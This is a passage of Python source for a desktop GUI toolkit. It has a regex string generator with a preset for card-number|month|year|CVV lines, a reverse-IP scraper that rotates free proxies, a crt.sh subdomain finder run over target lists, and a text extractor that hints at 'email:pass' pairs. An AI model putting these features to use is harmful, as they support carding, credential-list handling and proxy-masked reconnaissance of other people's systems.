        self.hoveredlist = ['🤗', '🙂', '😅', '😊', '😗', '😋', '😎']
        

        reHelpEmojy = Xchoice(self.hoveredlist)
        reHelpemoji = self.emoji_img(30, reHelpEmojy)
        self.reHelpText = customtkinter.CTkLabel(master=self.genregix__root, fg_color="transparent", image=reHelpemoji, text=f"")
        self.reHelpText.place(relx=0.25, rely=0.15, anchor=customtkinter.CENTER)

        self.reHelpText.bind('<Enter>', self.emojyCallback, add='+') 

        self.reHelpText2 = customtkinter.CTkLabel(master=self.genregix__root, fg_color="transparent", text=f"Help")
        self.reHelpText2.place(relx=0.2, rely=0.15, anchor=customtkinter.CENTER)

        self.regix_textbox = customtkinter.CTkTextbox(self.genregix__root, width=350)
        self.regix_textbox.place(relx=0.27, rely=0.6, anchor=customtkinter.CENTER)
        userN = os.getenv('username')
        self.regix_textbox.insert('0.0', f'[:alpha:] > Represents an alphabetic character.\n----------------\n[:digit:] > Represents a decimal digit.\n----------------\n[:alnum:] = Represents an alphanumeric character \n([:alpha:] and [:digit:]).\n----------------\n[:space:] > Represents a space character \n(but not other whitespace characters).\n----------------\n[:print:] > Represents a printable character.\n----------------\n[:cntrl:] > Represents a nonprinting character.\n----------------\n[:lower:] > Represents a lowercase character if Match \ncase is selected in Options.\n----------------\n[:upper:] > Represents an uppercase character if Match \ncase is selected in Options.\n----------------\n\\d > matches a digit, same as [0-9]\n----------------\n\\D > matches a non-digit, same as [^0-9]\n----------------\n\\s > matches a whitespace character \n(space, tab, newline, etc.)\n----------------\n\\S > matches a non-whitespace character\n----------------\n\\w > matches a word character\n----------------\n\\W > matches a non-word character\n----------------\n\\b > matches a word-boundary \n(NOTE: within a class, matches a backspace)\n----------------\n\\B > matches a non-wordboundary\n----------------\n')
        self.regix_textbox.configure(state="disabled")

        self.GenRcombobox = customtkinter.CTkComboBox(master=self.genregix__root, values=["Custom", "Credit Card", "Phone", "IP Address", "MAC"], command=self.combobox_callback)
        self.GenRcombobox.place(relx=0.75, rely=0.3, anchor=customtkinter.CENTER)

        self.rePayload = customtkinter.CTkEntry(self.genregix__root, width=245, placeholder_text="Payload")
        self.rePayload.place(relx=0.75, rely=0.5, anchor=customtkinter.CENTER)

        self.genAmount = customtkinter.CTkSlider(master=self.genregix__root, from_=1, to=99999, command=self.genAmountX, width=250)
        self.genAmount.place(relx=0.75, rely=0.6, anchor=customtkinter.CENTER)
        self.genAmount.set(regixGnAmount)

        self.GenRe_button = customtkinter.CTkButton(master=self.genregix__root, command=self.genre, text="Generate", width=150, height=20)
        self.GenRe_button.place(relx=0.75, rely=0.7, anchor=customtkinter.CENTER)

        self.GenReRes_button = customtkinter.CTkButton(master=self.genregix__root, command=self.opengenre, text="Result", width=150, height=20)
        self.GenReRes_button.place(relx=0.75, rely=0.8, anchor=customtkinter.CENTER)

    def combobox_callback(self, choice):
        if choice == 'Custom':
            self.rePayload.delete(0,"end")
            self.rePayload.insert(0,'Payload')

        if choice == 'Credit Card':
            self.rePayload.delete(0,"end")
            self.rePayload.insert(0, r'5[0-9]{15}\|[0-1][1-9]\|202[3-9]\|[0-9]{3}')

        if choice == 'Phone':
            self.rePayload.delete(0,"end")
            self.rePayload.insert(0, r'\+1[0-9]{10}')

        if choice == 'MAC':
            self.rePayload.delete(0,"end")
            self.rePayload.insert(0, r'00:[0-9A-F]\d:[0-9A-F]\d:[0-9A-F]\d:[0-9A-F]\d:[0-9A-F]\d')

        if choice == 'IP Address':
            self.rePayload.delete(0,"end")
            self.rePayload.insert(0, r'(3|4|5|6|7|8|9)\.(1[6-8])\.((4[6-9])|(5[0-4]))\.(([2-3][0-9])|(4[0-5]))')

    def genAmountX(self, value):
        global regixGnAmount

        regixGnAmount = int(value)
        self.genregix__root.title(f'Generate Regex > {regixGnAmount}')

    def genre(self):
        global CoolWaitStop

        CoolWaitStop = False

        tmppaylo = self.rePayload.get()

        if tmppaylo == '':
            return self.show_info(':D', 'Enter Your Custom Payload')
        if tmppaylo == 'Payload':
            return self.show_info(':D', 'Enter Your Custom Payload')

        consolelog('INFO', "Generator Started")

        #GenReTrigger()
        txr = threading.Thread(target=self.GenReTrigger)
        txr.daemon = True
        txr.start()

    def coolwait(self):
        global CoolWaitStop

        self.genregix__root.title(f'please wait')
        time.sleep(0.5)
        self.genregix__root.title(f'please wait.')
        time.sleep(0.5)
        self.genregix__root.title(f'please wait..')
        time.sleep(0.5)
        self.genregix__root.title(f'please wait...')

        if CoolWaitStop == True:
            self.genregix__root.title(f'Generate Regex > {regixGnAmount}')
        else:
            self.coolwait()

    def GenReTrigger(self):
        global CoolWaitStop

        txy = threading.Thread(target=self.coolwait)
        txy.daemon = True
        txy.start()

        self.GenRe_button.configure(state="disabled")
        self.GenReRes_button.configure(state="disabled")
    
        self.regix_textbox.delete("0.0", "end")
        userRe = self.rePayload.get()

        GenReCount = self.genAmount.get()
        GenReCount = int(GenReCount)

        for x in range(int(GenReCount)):
            try:
                Generated = rstr.xeger(rf'{userRe}')
            except Exception as err:
                console.print_exception(show_locals=True)
                consolelog('INFO', err)
                return self.show_error('Error!', f"Invalid Playload > {err}")

            try:
                with open('Result/Generator/result.txt', 'a', encoding="utf-8") as f:
                    f.write(f"{Generated}\n")
            except Exception as err:
                console.print_exception(show_locals=True)
                console.print_exception(show_locals=True)
                self.GenRe_button.configure(state="normal")
                self.GenReRes_button.configure(state="normal")
                CoolWaitStop = True
                return self.show_error('Error!', err)


        self.GenRe_button.configure(state="normal")
        self.GenReRes_button.configure(state="normal")

        consolelog('INFO', "Generator Finish")

        CoolWaitStop = True

        succ_msg = CTkMessagebox(title='Success', message=f'Generating "{GenReCount}" done.', icon="check", option_1="Close", option_2="Open")

        succ_response = succ_msg.get()

        if succ_response == "Open":
            self.GetResult('Result/Generator/result.txt')

    def opengenre(self):
        self.GetResult('Result/Generator/result.txt')

    def reip_trig(self):
        bot = threading.Thread(target=self.revip)
        bot.daemon = True
        bot.start()

    def revip(self):
    
        self.revip_root = customtkinter.CTkToplevel()
        self.revip_root.title('Options')
        self.revip_root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.revip_root.wm_iconphoto(False, mainico)
        self.revip_root.attributes("-topmost", True)

        self.revip_listbox = CTkListbox(self.revip_root, command=self.revip_value)
        self.revip_listbox.pack(fill="both", expand=True, padx=10, pady=10)

        self.revip_listbox.insert(0, "Import")
        self.revip_listbox.insert(1, "Targets")
        self.revip_listbox.insert(2, "Generator")
        self.revip_listbox.insert("END", "Result")

    def revip_value(self, selected_option):
        self.revip_root.destroy()

        def LoopFixX2():
            global revip_gstop
            global totalProxies
            global InScopeRevIP

            try:
                if revip_gstop == 'true':
                    return RevIphasStop()

                if len(totalProxies) > 0:
                    if len(totalProxies) < 10:
                        return RevIphasStop()

                if len(InScopeRevIP) == 0:
                    return RevIphasStop()

                sitex = Xchoice(InScopeRevIP)
                site = sitex.replace('\n', '')
                print(f"sitex: {sitex}")
                self.start_revip(site)
                InScopeRevIP.remove(sitex)
                self.revip_app.title(f'Reverse IP > {len(InScopeRevIP)} > {gthosts}')
                self.TtalP.configure(text=f"Proxies: {len(totalProxies)}")

            except Exception as err:
                console.print_exception(show_locals=True)
                console.print_exception(show_locals=True)
                
            LoopFixX2()

        def xreip_thread():
            global revip_bots 
            global InScopeRevIP
            global revip_gstop

            InScopeRevIP = []
            revip_gstop = 'false'

            with open(self.userlist, 'r', encoding="utf-8") as f:
                InScopeRevIP = list(f)
         
            self.revip_save_button.configure(text="Stop", command=self.revi_stopevent, state="normal")   

            # start_revip_main()
            bot = threading.Thread(target=LoopFixX2)
            bot.daemon = True
            bot.start()

        def RevIphasStop():
            consolelog("INFO", 'RevIP Stop.')
            # show_checkmark('Success', 'RevIP Stop.')
            # self.revip_app.title(f'Reverse IP {len(InScopeRevIP)} > {gthosts}')
            self.revip_save_button.configure(text="Start", command=xreip_thread, state="normal")
            
            return self.auto_function()

        if selected_option == 'Import':
            self.userlist = filedialog.askopenfilename()

        elif selected_option == 'Targets':
            self.userlist = 'core/txt/targets.txt'

        elif selected_option == 'Generator':
            self.userlist = 'Result/Generator/result.txt'

        elif selected_option == 'Result':
            return self.GetResult('Result/Reversed/result.txt')   
        
        if self.userlist:
            
            ipsCount = self.Count_lines(self.userlist)

            self.revip_app = customtkinter.CTkToplevel()  # create CTk window like you do with the Tk window
            self.revip_app.title(f'Reverse IP > {ipsCount}')
            self.revip_app.iconbitmap('core/logo.ico')
            ico = Image.open('core/logo.png')
            mainico = ImageTk.PhotoImage(ico)
            self.revip_app.wm_iconphoto(False, mainico)
            self.revip_app.geometry("550x340")     
            self.revip_app.attributes("-topmost", True)
            self.revip_app.resizable(0,0)

            self.revip_textbox = customtkinter.CTkTextbox(self.revip_app, width=410, height=340)
            self.revip_textbox.grid(row=0, column=0, sticky="nsew")

            self.revip_save_button = customtkinter.CTkButton(master=self.revip_app, command=xreip_thread, text="Start", state="normal")
            self.revip_save_button.place(relx=0.9, rely=0.1, anchor=customtkinter.CENTER)
            
            self.revip_proxies = customtkinter.CTkComboBox(master=self.revip_app, values=["No Proxies", "Free Proxies", "import [HTTP]"], width=110, command=self.proxiesVar_trig)
            self.revip_proxies.place(relx=0.88, rely=0.41, anchor=customtkinter.CENTER)

            self.TtalP = customtkinter.CTkLabel(master=self.revip_app, text=f"", fg_color="transparent")
            self.TtalP.place(relx=0.88, rely=0.5, anchor=customtkinter.CENTER)
            
            self.revipExport_button = customtkinter.CTkButton(master=self.revip_app, text="Export", command=self.revipexport_lst)
            self.revipExport_button.place(relx=0.9, rely=0.3, anchor=customtkinter.CENTER)

            self.bots_slider = customtkinter.CTkSlider(master=self.revip_app, from_=1, to=8, command=self.bots_valueRip, width=125)
            self.bots_slider.place(relx=0.88, rely=0.9, anchor=customtkinter.CENTER)
            self.bots_slider.set(revip_bots)

            self.bots_txt = customtkinter.CTkLabel(master=self.revip_app, text=f"Threads: {revip_bots}", fg_color="transparent")
            self.bots_txt.place(relx=0.89, rely=0.83, anchor=customtkinter.CENTER)

            self.xri_rd_button = customtkinter.CTkButton(master=self.revip_app, text="Result", command=self.res_trigger)
            self.xri_rd_button.place(relx=0.9, rely=0.2, anchor=customtkinter.CENTER)

        else:
          return self.show_info(':D', 'No Option sir.')

    def start_revip(self, site):
        global gthosts
        global revip_gstop
        global InScopeRevIP
        global totalProxies

        ua = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

        site = site.replace("https://", "").replace("http://", "")

        proxiesCheck = self.revip_proxies.get()
        while True:
            if revip_gstop == 'true':
                break
       
            if proxiesCheck == 'No Proxies':
                consolelog("INFO", f'Reverse > {site}')

                try:
                    response = requests.get("https://rapiddns.io/sameip/" + site + "?full=1#result", headers=ua, timeout=5).content.decode("utf-8")
                except Exception as err: 
                    consolelog('INFO', err)
                    return
            else:    
                prx = Xchoice(totalProxies)
                prx = prx.replace('\n', '')
                consolelog("INFO", f'Reverse > {site} > {prx}')
                proxies = {"http": f"http://{prx}"}

                try:
                    response = requests.get("https://rapiddns.io/sameip/" + site + "?full=1#result", headers=ua, proxies=proxies, timeout=5).content.decode("utf-8")
                except Exception as err: 
                    totalProxies.remove(f"{prx}\n")
                    return

            pattern = r"</th>\n<td>(.*?)</td>"
            results = re.findall(pattern, response)
            results = set(results) 
            outtxt = f'{site} > [{str(len(results))}]'
            
            consolelog('INFO', outtxt)

            if len(results) != 0:
                for line in results:

                    if revip_gstop == 'true':
                        break

                    line = line.strip() 
                    if line.startswith("www."):
                        line = "" + line[4:]
                    
                    self.revip_textbox.insert("0.0", line + '\n')
                    with open('Result/Reversed/result.txt', 'a+', encoding="utf-8") as f:
                        f.write(f'{line}\n')     
                    gthosts += 1
            
            break

    def revi_stopevent(self):
        global revip_gstop

        revip_gstop = 'true'
        self.revip_save_button.configure(state="disabled")

    def proxiesVar(self, choice):
        global totalProxies

        self.RevIpCoolWaitStop2 = False

        try:
            if choice == 'import [HTTP]':
                usrpath = filedialog.askopenfilename(filetypes=[("txt file", ".txt")])
                
                shutil.copyfile(usrpath, 'tmp/http.txt')

                totalProxies = self.Count_lines('tmp/http.txt')

                with open('tmp/http.txt', 'r', encoding="utf-8") as f:
                    totalProxies = list(f)

                self.TtalP.configure(text=f"Proxies: {len(totalProxies)}")

            if choice == 'Free Proxies':
            
                try:
                    os.remove('tmp/http.txt')
                    
                except:
                    pass

                bot = threading.Thread(target=self.coolwait2)
                bot.daemon = True
                bot.start()

                consolelog('INFO', "Grabbing HTTP... 1/2")          
                self.get_proxies('http://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all')
                consolelog('INFO', "Grabbing HTTP... 2/2")
                self.get_proxies('http://www.proxyscan.io/download?type=http')
                

                with open('tmp/http.txt', 'r', encoding="utf-8") as f:
                    totalProxies = list(f)

                self.RevIpCoolWaitStop2 = True

            if choice == 'No Proxies':
                try:
                    os.remove('tmp/http.txt')
                except:
                    pass

                self.TtalP.configure(text=f"")
    
        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

    def coolwait2(self):
        global totalProxies

        self.TtalP.configure(text=f'please wait')
        time.sleep(0.5)
        self.TtalP.configure(text=f'please wait.')
        time.sleep(0.5)
        self.TtalP.configure(text=f'please wait..')
        time.sleep(0.5)
        self.TtalP.configure(text=f'please wait...')

        if self.RevIpCoolWaitStop2 == True:
            self.TtalP.configure(text=f"Proxies: {len(totalProxies)}")
        else:
            self.coolwait2()

    def proxiesVar_trig(self, choice):
        bot = threading.Thread(target=self.proxiesVar, args=(choice,))
        bot.daemon = True
        bot.start()

    def revipexport_lst(self):
        revipex_res = self.revip_textbox.get("0.0", "end")
    
        filename = filedialog.asksaveasfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
        if str(filename) == "None":
            return
        with open(filename, 'w', encoding='utf-8') as fh:
            fh.write(revipex_res)


        try:
            matches = re.findall(r"name='(.*?)'", str(filename),re.IGNORECASE)
            cleanMatches = list(set(matches))
            outpath = ""
            for match in cleanMatches:
                outpath = str(match)
                break
        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

        try:
            with open(outpath, 'r', encoding="utf-8") as f:
                f.write(revipex_res)
        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)
        
        self.auto_function()
        return self.show_checkmark('Success', 'Exported Successfully.')

    def res_trigger(self):
        self.GetResult('Result/Reversed/result.txt')

    def bots_valueRip(self, value):
        global revip_bots

        revip_bots = int(value)
        reip_txt = f'Threads: {revip_bots}'
        self.bots_txt.configure(text=reip_txt)

        self.settings_db('post', 'RevIpBots', revip_bots)

    def subf(self):
            
        self.subf_root = customtkinter.CTkToplevel()
        self.subf_root.title('Options')    
        self.subf_root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.subf_root.wm_iconphoto(False, mainico)               
        self.subf_root.attributes("-topmost", True)

        self.subf_listbox = CTkListbox(self.subf_root, command=self.subf_value)
        self.subf_listbox.pack(fill="both", expand=True, padx=10, pady=10)

        self.subf_listbox.insert(0, "Import")
        self.subf_listbox.insert(1, "Targets")
        self.subf_listbox.insert("END", "Result")

    def subf_value(self, selected_option):
        global subf_bots

        def subfinr(site):
            global subf_gstop
            global gsubf
            global inScopeSFinder
            
            site = site.replace('https://', '').replace('http://', '')
            URL = f'https://crt.sh/?q={site}'

            while True:
                if subf_gstop == 'true':
                    return
                
                try:
                    page = requests.get(URL, timeout=10)
                    break
                except Exception as err:
                    consolelog('INFO', f'{URL} > {err}')
            
            soup = BeautifulSoup(page.content, 'html.parser')
            
            try:
                results = soup.findAll("td", {"class": "outer"})
                rows = results[1].findAll('tr')

                fifth_columns = []
                for row in rows[1:]:
                    fifth_columns.append(str(row.findAll('td')[4]))

                clean_data = []
                for data in fifth_columns:
                    remove_td = data.replace("<td>","").replace('</td>', ',')
                    add_comma_br = remove_td.replace("<br>",",").replace('<br/>', ',').replace('*.','')
                    clean_data.append(add_comma_br)

                string_data = "".join(clean_data)

                list_of_subdomains = string_data.split(',')
                subfres = set(list_of_subdomains)
            
                if '.' not in str(subfres):
                    outtxt = f'> {site} > [0]'   
                else:
                    outtxt = f'{site} > [{str(len(subfres))}]'    

            
                consolelog('INFO', outtxt)

                for line in subfres:
                    if '.' in line:
                        with open('Result/SubFinder/result.txt', 'a+', encoding='utf-8') as f:
                            f.write(line + "\n") #write output
                        
                        self.subf_textbox.insert("0.0", f'{line}\n')
                        gsubf += 1
                        self.subf_app.title(f'SubFinder > {len(inScopeSFinder)} > {gsubf}')
            except Exception as err:     
                consolelog('INFO', err)


        def start_subf_trigger():
            global subf_gstop
            global gsubf
            global subf_bots
            global inScopeSFinder

            subf_gstop = 'false'
            gsubf = 0
            inScopeSFinder = []

            try:
                with open(self.userlist, 'r', encoding="utf-8") as f:
                    inScopeSFinder = list(f)
            except Exception as err:
                consolelog('INFO', err)

            if len(inScopeSFinder) == 0:
                return self.show_info(':D', 'InScope: 0')
            
            self.subf_app.title(f'SubFinder > {len(inScopeSFinder)}')


            self.subf_textbox.delete("0.0", "end")
            self.subf_start_button.configure(text="Stop", command=self.subf_stopevent)
            
            consolelog('INFO', "SubFinder Starting...")
            for bot in range(subf_bots):
                bot = threading.Thread(target=start_subf)
                bot.daemon = True
                bot.start()

        def start_subf():
            global gsubf
            global subf_gstop
            global inScopeSFinder

            while True:
                InScopeCount = len(inScopeSFinder)

                if InScopeCount == 0:
                    break

                if subf_gstop == 'true':
                    break
                
                domain = Xchoice(inScopeSFinder)
                domain = domain.replace('\n', '')
                if '.' in domain:
                    subfinr(domain)
                    self.auto_function()
                    inScopeSFinder.remove(f'{domain}\n')
                else:
                    inScopeSFinder.remove(f'{domain}\n')
                            
            self.subf_start_button.configure(text="Start", command=start_subf_trigger, state="normal")
            consolelog("INFO", "SubFinder Stoped.")
            self.subf_app.title(f'SubFinder > {len(inScopeSFinder)} > {gsubf}')
            return self.show_checkmark('Success', 'SubFinder has Stop.')

        if selected_option == 'Import':
            self.userlist = filedialog.askopenfilename()

        elif selected_option == 'Targets':
            self.userlist = 'core/txt/targets.txt'
     
        elif selected_option == 'Result':
            return self.GetResult('Result/SubFinder/result.txt')
        
        if self.userlist:
            self.subf_root.destroy()
            InScopeCount = self.Count_lines(self.userlist)
            self.subf_app = customtkinter.CTkToplevel()  # create CTk window like you do with the Tk window
            self.subf_app.title(f'SubFinder > {InScopeCount}')
            self.subf_app.iconbitmap('core/logo.ico')
            ico = Image.open('core/logo.png')
            mainico = ImageTk.PhotoImage(ico)
            self.subf_app.wm_iconphoto(False, mainico)
            self.subf_app.geometry("550x340")
            self.subf_app.attributes("-topmost", True)
            self.subf_app.grid_columnconfigure(0, weight=1)
            self.subf_app.grid_rowconfigure(0, weight=1)

            targets_text = self.get_text_from_file(self.userlist)
            if targets_text:
                pass
            else:
                InScopeCount = 0

            self.subf_textbox = customtkinter.CTkTextbox(self.subf_app, width=410, height=340)
            self.subf_textbox.grid(row=0, column=0, sticky="nsew")

            self.subFSideBAR = customtkinter.CTkFrame(self.subf_app, fg_color="red", width=50, corner_radius=5)
            self.subFSideBAR.grid(row=0, column=1, rowspan=4, sticky="nsew")
            self.subFSideBAR.grid_columnconfigure(0, weight=1)
            self.subFSideBAR.grid_rowconfigure((0,1,2,3,4), weight=0)

            self.subf_start_button = customtkinter.CTkButton(master=self.subFSideBAR, command=start_subf_trigger, corner_radius=0, fg_color="red", text_color="black", text="Start")
            self.subf_start_button.grid(row=0, column=0)
            
            self.subfExport_button = customtkinter.CTkButton(master=self.subFSideBAR, text="Export", corner_radius=0, fg_color="red", text_color="black", command=self.subFexport_lst)
            self.subfExport_button.grid(row=1, column=0,)

            self.ri_rd_button = customtkinter.CTkButton(master=self.subFSideBAR, text="Result", corner_radius=0, fg_color="red", text_color="black", command=self.subf_res_trigger)
            self.ri_rd_button.grid(row=2, column=0)

            self.subFbots_txt = customtkinter.CTkLabel(master=self.subFSideBAR, text_color="black", text=f"Threads: {revip_bots}", fg_color="transparent")
            self.subFbots_txt.grid(row=3, column=0)

            self.subFbots_slider = customtkinter.CTkSlider(master=self.subFSideBAR, from_=1, to=8, command=self.subFbots_value, width=100)
            self.subFbots_slider.grid(row=4, column=0)
            self.subFbots_slider.set(subf_bots)

    def subf_stopevent(self):
        global subf_gstop

        subf_gstop = 'true'
        self.subf_start_button.configure(text="Stop", state="disabled")
        self.subf_app.title(f'Please Wait...')

    def subf_res_trigger(self):
        self.GetResult('Result/SubFinder/result.txt')

    def subFbots_value(self, value):
        global subf_bots

        subf_bots = int(value)
        subf_txt = f'Threads: {subf_bots}'
        self.subFbots_txt.configure(text=subf_txt)

        self.settings_db('post', 'SubfBots', subf_bots)

    def subFexport_lst(self):
        fubfex_res = self.subf_textbox.get("0.0", "end")
    
        filename = filedialog.asksaveasfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
        
        if str(filename) == "None":
            return
        
        with open(filename, 'w', encoding='utf-8') as fh:
            fh.write(fubfex_res)
        
        self.auto_function()
        return self.show_checkmark('Success', 'Exported Successfully.')

    def subf_trig(self):
        bot = threading.Thread(target=self.subf)
        bot.daemon = True
        bot.start()

    def Extract(self):
        self.Extract_root = customtkinter.CTkToplevel()
        self.Extract_root.title('Type?')
        self.Extract_root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.Extract_root.wm_iconphoto(False, mainico)
        self.Extract_root.attributes("-topmost", True)

        self.Extract_listbox = CTkListbox(self.Extract_root, command=self.extr_main)
        self.Extract_listbox.pack(fill="both", expand=True, padx=10, pady=10)
    

        self.Extract_listbox.insert(0, "Regex")
        self.Extract_listbox.insert(1, "Emails")
        self.Extract_listbox.insert(2, "Urls")
        self.Extract_listbox.insert("END", "Phone")

    def extr_main(self, selected_option):

        if selected_option == 'Urls':
            self.extrt('Urls')
        elif selected_option == 'Emails':
            self.extrt('Emails')
        elif selected_option == 'Phone':
            self.extrt('Phone')
        elif selected_option == 'Regex':
            self.extrt('Regex')
        else:
            return self.show_info('Soon', 'under construction...')

    def extrt(self, type):

        self.Extract_root.destroy()
        self.extrt_app = customtkinter.CTkToplevel()
        self.extrt_app.title(f'Extractor > {type}')
        self.extrt_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.extrt_app.wm_iconphoto(False, mainico)   
        self.extrt_app.geometry("550x340")                    
        self.extrt_app.resizable(0,0)
        self.extrt_app.attributes("-topmost", True)
        self.extrt_app.grid_columnconfigure(0, weight=1)
        self.extrt_app.grid_rowconfigure(0, weight=1)

        self.extrt_textbox = customtkinter.CTkTextbox(self.extrt_app, width=410, height=340)
        self.extrt_textbox.grid(row=0, column=0, sticky="nsew")
        self.extrt_textbox.insert("0.0", "paste your text here.")

        self.exrightFrame = customtkinter.CTkFrame(self.extrt_app, width=100, corner_radius=0, fg_color="transparent")
        self.exrightFrame.grid(row=0, column=0, sticky="nsew")
        self.exrightFrame.grid_rowconfigure((0,1,2,3), weight=1)
        self.exrightFrame.grid_columnconfigure(0, weight=1)

        if type == 'Regex':
            
            self.regVar = customtkinter.StringVar(value="Your Regex")
            self.extrt_regex = customtkinter.CTkEntry(master=self.exrightFrame, width=135, height=30, textvariable=self.regVar)
            self.extrt_regex.place(relx=0.96, rely=0.68, anchor=customtkinter.CENTER)
            self.extrt_regex.bind("<Enter>", lambda e:self.regAnim())
            self.extrt_regex.bind("<Leave>", lambda e:self.regAnimOut())


        self.eXsplit_var = customtkinter.StringVar(value="Regex")
        self.eXsplit_switch = customtkinter.CTkSwitch(master=self.extrt_app, text=f"Regex", command=self.ShowSplit, variable=self.eXsplit_var, onvalue="Regex", offvalue="Split")
        self.eXsplit_switch.place(relx=0.9, rely=0.55, anchor=customtkinter.CENTER)

        splitVar = customtkinter.StringVar(value=":")
        self.extrt_split = customtkinter.CTkEntry(master=self.extrt_app, width=135, height=30, textvariable=splitVar)
        self.extrt_split.place(relx=1.5, rely=0.68, anchor=customtkinter.CENTER)

        # self.extrt_split.bind("<Enter>", spltAnim)
        self.extrt_split.bind("<Enter>", lambda e:self.spltAnim())
        self.extrt_split.bind("<Leave>", lambda e:self.spltAnimOut())
        
        self.extrt_button = customtkinter.CTkButton(master=self.extrt_app, command=self.start_exThreads, text="Extract")
        self.extrt_button.place(relx=0.9, rely=0.9, anchor=customtkinter.CENTER)
        
        self.eXimport_button = customtkinter.CTkButton(master=self.extrt_app, text="Import", command=self.importEx_lst)
        self.eXimport_button.place(relx=0.9, rely=0.1, anchor=customtkinter.CENTER)

        self.eXexport_button = customtkinter.CTkButton(master=self.extrt_app, text="Export", command=self.exportEx_lst)
        self.eXexport_button.place(relx=0.9, rely=0.2, anchor=customtkinter.CENTER)

    def start_ex(self, type):
        global total_valid

        total_valid = 0

        extr_text = self.extrt_textbox.get("0.0", "end")

        with open('tmp/tmpexfile.txt', 'w', encoding='utf-8') as tmpf:
            tmpf.write(extr_text + '\n')
        
        self.extrt_textbox.delete("0.0", "end")

        with open('tmp/tmpexfile.txt', 'r', encoding='utf-8') as tmpf:
            lines = tmpf.read()
        
        issplit = self.extrt_split.get()

        exType = self.eXsplit_var.get()
        
        if exType == "Split":
            lines = lines.split()
            try:  
                for line in lines:
                    linex = line.split(issplit)[0]
                    self.extrt_textbox.insert("0.0", f'{linex}\n')
                    total_valid += 1

                    self.extrt_app.title(f'Extract {type} -> {str(total_valid)}')
            except Exception as err:
                console.print_exception(show_locals=True)

        else:
            if type == 'Urls':
                regex=r"\b((?:https?://)?(?:(?:www\.)?(?:[\da-z\.-]+)\.(?:[a-z]{2,6})|(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|(?:(?:[0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(?:ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])))(?::[0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])?(?:/[\w\.-]*)*/?)\b"
            
            elif type == 'Emails':
                regex=r'[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+'
            elif type == 'Phone':
                regex=r'[\+\(]?[1-9][0-9 .\-\(\)]{8,}[0-9]'
            elif type == 'Regex':
                rgx = self.extrt_regex.get()
                regex=rgx
            
            # if type == 'Urls':
            matches = re.findall(regex, lines,re.IGNORECASE)
            # elif type == 'Emails':
            #     matches = re.findall(regex ,lines,re.IGNORECASE)
            
            all_found = list(set(matches))

            for found in all_found:
                self.extrt_textbox.insert("0.0", f'{found}\n')
                total_valid += 1
                self.extrt_app.title(f'Extract {type} -> {str(total_valid)}')

        try:
            os.remove('tmp/tmpexfile.txt')
        except Exception as err:
            consolelog('WARNING', err)

    def regAnim(self):
        self.extrt_regex.place(relx=0.9, rely=0.68, anchor=customtkinter.CENTER)

    def regAnimOut(self):
        self.extrt_regex.place(relx=0.96, rely=0.68, anchor=customtkinter.CENTER)

    def start_exThreads(self):
        global total_valid

        total_valid = 0

        if len(self.extrt_textbox.get("0.0", "end")) < 2:
            consolelog('INFO', "Text is required!")
            return self.show_info('Error!', 'Text is required!')

        exType = self.eXsplit_var.get()
        
        if exType == "Regex":
            if type == "Regex":
                if self.extrt_regex.get() == "Your Regex":
                    consolelog('INFO', "Regex is required!")
                    return self.show_info('Error!', 'Regex is required!\ntry: (.*?): for email:pass')
            
        bot = threading.Thread(target=self.start_ex, args=(type, ))
        bot.daemon = True
        bot.start()

    def ShowSplit(self):
        exType = self.eXsplit_var.get()

        if exType == "Split":
            try:
                self.extrt_split.place(relx=0.96, rely=0.68, anchor=customtkinter.CENTER)
                self.eXsplit_switch.configure(text="Split")
                self.extrt_regex.place(relx=1.5, rely=0.68, anchor=customtkinter.CENTER)
            except:
                pass
        else:
            try:
                self.extrt_split.place(relx=1.5, rely=0.68, anchor=customtkinter.CENTER)
                self.eXsplit_switch.configure(text="Regex")
                self.extrt_regex.place(relx=0.96, rely=0.68, anchor=customtkinter.CENTER)
                
            except:
                pass

    def spltAnim(self):
        self.extrt_split.place(relx=0.9, rely=0.68, anchor=customtkinter.CENTER)
    
    def spltAnimOut(self):
